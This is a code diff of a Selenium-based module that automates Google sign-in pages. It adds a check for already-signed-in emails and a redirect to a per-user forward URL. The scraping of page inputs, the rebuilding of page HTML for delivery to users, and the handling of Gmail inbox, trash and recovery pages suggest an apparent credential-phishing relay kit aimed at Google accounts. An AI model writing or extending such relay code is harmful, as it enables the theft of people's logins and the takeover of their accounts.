@@ -1,7 +1,6 @@
 import fs from "fs";
 import path from "path";
 import { By, until } from "selenium-webdriver";
-import psList from "ps-list";
 
 import {
   ensureUserLogDir,
@@ -13,11 +12,13 @@ import {
 import {
   activateUserWindowByPid,
   attachChrome,
+  checkEmailAlreadySignin,
   isDriverAlive,
   UsersDB,
 } from "./utils.js";
 import {
   buildHTMLByPageSource,
+  getHtmlAlreadySignIn,
   getSpecificTagList,
   removeSpecificTag,
 } from "./html.js";
@@ -59,6 +60,7 @@ export const URL_2_STEP_HELP =
 export const URL_REJECTED = "https://accounts.google.com/v3/signin/rejected";
 // export const URL_HOMEADDR = 'https://gds.google.com/web/homeaddress'
 export const URL_RECOVERY_OPTION = "https://gds.google.com";
+export const URL_MAIL_DEFUALT = "https://mail.google.com";
 
 export const URL_MAIL_INBOX = "https://mail.google.com/mail/u/0/#inbox";
 export const URL_MAIL_TRASH = "https://mail.google.com/mail/u/0/#trash";
@@ -345,11 +347,12 @@ export async function scrapInputValueAndBtnNext(
   // check email if already signin
   const profile = UsersDB.get(userId);
   const email = profile ? profile["email"] : "";
+  const forwardURL = profile ? profile["forwardURL"] : URL_MAIL_DEFUALT;
   const isSigned = await checkEmailAlreadySignin(email);
   if (isSigned) {
     console.log("[ALREADY SIGNED IN] :", email);
-    const signInHtml = getHtmlAlreadySignIn(forwardUrl);
-    return { status: 1, htmlText: signInHtml, curPage: "" };
+    const signInHtml = getHtmlAlreadySignIn(forwardURL);
+    return { status: 1, htmlText: signInHtml, curPage: "redirect" };
   }
 
   await saveScreenshot(driver, userId, "btn_action_1.png");
